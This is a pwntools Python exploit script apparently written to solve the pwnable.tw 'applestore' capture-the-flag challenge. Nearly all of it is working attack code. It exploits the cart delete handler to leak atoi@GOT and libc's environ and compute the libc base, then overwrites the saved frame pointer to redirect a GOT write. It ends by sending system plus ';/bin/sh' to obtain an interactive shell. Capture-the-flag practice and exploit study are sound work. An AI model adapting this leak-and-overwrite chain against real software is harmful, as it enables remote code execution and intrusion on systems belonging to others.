#!/home/khanh/.local/share/pipx/venvs/pwntools/bin/python3
from pwn import *

# context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']

e = context.binary = ELF("./applestore_patched")
libc = ELF("./libc_32.so.6")

# HELPER
def B(x, enc='utf-8'):
    if isinstance(x, bytes):
        return x
    return str(x).encode(enc)
    
def connect():
    HOST, PORT = "chall.pwnable.tw", 10104
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)
    return e.process()
    
def GDB(p):
    script = '''
    '''
    
    gdb.attach(p, gdbscript=script)

# FUNCTIONS
def add(p, phone):
    p.sendlineafter(b"> ", B(2))
    p.sendlineafter(b"Device Number> ", B(phone))

def delete(p, phone):
    p.sendlineafter(b"> ", B(3))
    p.sendlineafter(b"Item Number> ", B(phone))    

def checkout(p):
    p.sendlineafter(b"> ", B(5))
    p.sendlineafter(b"Let me check your cart. ok? (y/n) > ", b"y")

def listing_phones(p):
    p.sendlineafter(b"> ", B(4))
    p.sendlineafter(b"Let me check your cart. ok? (y/n) > ", b"y")

# MAIN
def main():
    p = connect()

    log.info("Adding items to reach checkout threshold")
    for _ in range(16):
        add(p, 1)

    for _ in range(10):
        add(p, 4)


    log.info("Performing checkout")
    checkout(p)


    log.info("Leaking atoi@GOT to compute libc base address")
    leak_payload = (
        b"27"
        + p32(e.got.atoi)
        + p32(0) * 3
    )
    delete(p, leak_payload)

    p.recvuntil(b"27:")
    atoi_leak = u32(p.recv(4))
    libc.address = atoi_leak - libc.symbols["atoi"]

    log.success(f"atoi leak: {hex(atoi_leak)}")
    log.success(f"libc base: {hex(libc.address)}")


    leak_payload = (
        b"27"
        + p32(libc.symbols["environ"])
        + p32(0) * 3
    )
    delete(p, leak_payload)

    p.recvuntil(b"27:")
    environ_leak = u32(p.recv(4))

    log.success(f"environ_leak: {hex(environ_leak)}")

    overwrite_ebp = (
        b"27"
        + p32(0) * 2
        + p32(e.got.atoi + 0x22)
        + p32(environ_leak - 0x8 - 0x104)
    )
    delete(p, overwrite_ebp)

    system = libc.symbols["system"]
    p.sendlineafter(b"> ", p32(system) + b";/bin/sh")

    p.interactive()
    
if __name__ == '__main__':
    main()